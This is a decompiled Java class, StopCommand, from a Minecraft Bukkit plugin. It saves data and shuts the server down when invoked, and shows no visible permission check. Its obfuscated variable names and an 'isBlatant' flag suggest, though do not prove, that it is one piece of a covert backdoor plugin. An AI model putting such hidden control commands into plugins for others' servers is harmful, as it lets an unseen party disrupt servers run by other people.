/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.command.CommandSender
 *  org.bukkit.entity.Player
 */
package me.system.runner.command.impl;

import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.methods.API;
import me.system.runner.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

public class StopCommand
extends Command {
    public StopCommand() {
        StopCommand lllllllllllllllllllIlIlllIIlIlll;
    }

    @Override
    public void execute(Core lllllllllllllllllllIlIlllIIlIlII, String lllllllllllllllllllIlIlllIIlIIll, String[] lllllllllllllllllllIlIlllIIlIIlI, Player lllllllllllllllllllIlIlllIIlIIII) {
        lllllllllllllllllllIlIlllIIlIIII.sendMessage(Settings.PREFIX("Stopping the server..."));
        API.saveConfig();
        Bukkit.getServer().savePlayers();
        Bukkit.getServer().dispatchCommand((CommandSender)Bukkit.getServer().getConsoleSender(), "save-all");
        Bukkit.getServer().shutdown();
    }

    @Override
    public boolean isBlatant() {
        return true;
    }
}

